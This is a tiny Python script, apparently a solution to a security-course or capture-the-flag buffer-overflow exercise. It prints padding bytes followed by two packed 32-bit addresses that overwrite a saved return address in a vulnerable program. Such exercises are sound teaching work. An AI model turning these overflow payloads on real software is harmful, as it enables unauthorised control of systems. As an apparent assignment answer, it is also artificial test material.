#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x00'*12 + pack("<I", 0xfffefdf8) + pack("<I", 0x080488c5))
